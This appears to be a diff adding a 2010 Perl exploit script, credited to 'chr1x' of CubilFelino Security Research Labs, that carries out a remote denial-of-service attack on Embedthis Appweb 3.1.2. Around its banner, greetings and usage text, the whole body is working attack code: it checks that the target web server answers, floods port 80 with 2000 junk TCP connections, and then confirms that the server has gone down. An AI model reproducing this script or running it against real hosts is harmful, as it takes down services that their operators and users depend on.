@@ -1,0 +1,102 @@
+#!/usr/bin/perl
+ 
+################################################################################
+# 
+# +------------------------------------------------------------------------+
+# |                                 .......                                |
+# |                         ..''xxxxxxxxxxxxxxx'...                        |
+# |                    ..'xxxxxxxxxxxxxxxxxxxxxxxxxxx..                    |
+# |                 ..'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'.                 |
+# |               .'xxxxxxxxxxxxxxxxxxxxxxxxxxxx'''.......'.               |
+# |             .'xxxxxxxxxxxxxxxxxxxxx''......        ...  ..             |
+# |            .xxxxxxxxxxxxxxxxxx'...         ........      .'.           |
+# |           'xxxxxxxxxxxxxxx'......                          '.          |
+# |          'xxxxxxxxxxxxxx'..'x..                            .x.         |
+# |         .xxxxxxxxxxxx'...'..                  ...           .'         |
+# |         'xxxxxxxxx'..  .                          ..        .x.        |
+# |         xxxxxxx'.                                  ..        x.        |
+# |         xxxx'.                ....                  x        x.        |
+# |         'x'.            ...'xxxxxxx'.               x       .x.        |
+# |         .x'.         .'xxxxxxxxxxxxxx.             ''       .'         |
+# |          .xx.      .'xxxxxxxxxxxxxxxx.           .'xx'''.  .'          |
+# |           .xx..    'xxxxxxxxxxxxxxxx'          .'xxxxxxxxx''.          |
+# |            .'xx'.  .'xxxxxxxxxxxxxxx.      ..'xxxxxxxxxxxx'            |
+# |              .xxx'.  .xxxxxxxxxxxx'.    .'xxxxxxxxxxxxxx'.             |
+# |                .xxxx'.'xxxxxxxxx'.      xxx'xxxxxxxxxx'.               |
+# |                  .'xxxxxxx'....          ...xxxxxxx'.                  |
+# |                     ..'xxxxx'..         ..xxxxx'..                     |
+# |                          ....'xx'.....''''...                          |
+# |                                                                        |
+# |                    CubilFelino Security Research Labs                  |
+# |                            proudly presents...                         |
+# +------------------------------------------------------------------------+
+#
+#	              Embedthis Appweb 3.1.2 Remote DoS 
+#
+#
+# Greets: l1l1th (my h4x0r bab3), nitr0us, alt3kx, hkm, r1l0, b0rr3x, w01f,
+#	  w0lf47, gh0st, CHiP, corelanc0d3r and all the crew of sectester.net. 
+#
+################################################################################
+
+# Exploit Title: Embedthis Appweb 3.1.2 Remote DoS
+# Date: Mar 12, 2010
+# Author: chr1x
+# Software Link: http://embedthis.com/downloads/index.html 
+# Version: 3.1.2
+# Tested on: Windows XP SP3 (Spanish Edition)
+
+# st4rt of v00d00 c0d3 XD
+
+use HTTP::Lite;
+use IO::Socket;
+use locale;
+
+if ($#ARGV != 1) { print "
+############################################################
+ CubilFelino Security Labs Embedthis Appweb 3.1.2 Remote DoS
+		by chr1x\@sectester.net
+############################################################
+
+Usage: ". $0 ." -h (ip address)\n
+
+"; exit; } &main();
+
+
+sub main {
+print "
+############################################################
+ CubilFelino Security Labs Embedthis Appweb 3.1.2 Remote DoS
+		by chr1x\@sectester.net
+############################################################
+
+";
+# Variables
+$DossedIP = $ARGV[1];
+# Execution functions
+&appWebCheck();
+sleep 30;
+&afterDoS();
+}
+
+sub appWebCheck {
+print "[*] Verifying that AppWeb is running at $DossedIP in port 80\n";
+my $http = new HTTP::Lite;
+my $req = $http->request("http://$DossedIP/") 
+        or die "[*] Remote address $DossedIP seems not to be up, stopped";
+if ($req) { print "[*] w00t! Appweb seems to be running! Sending DoS.. XD\n"; 
+for ($i=1; $i<=2000; $i++) {    
+my $sock = new IO::Socket::INET (PeerAddr => $DossedIP, PeerPort => '80', Proto => 'tcp', Type => SOCK_STREAM,);
+if ($sock) { 
+print "[*] Sending Connection request Number: $i\n";
+print $sock "Die Biatch!";
+close($sock);
+}}}}
+
+sub afterDoS {
+
+$http = new HTTP::Lite;
+$req = $http->request("http://$DossedIP/") 
+        or die "[*] Webserver DoSsed!! Port 80 is unreacheable now.";
+}
+
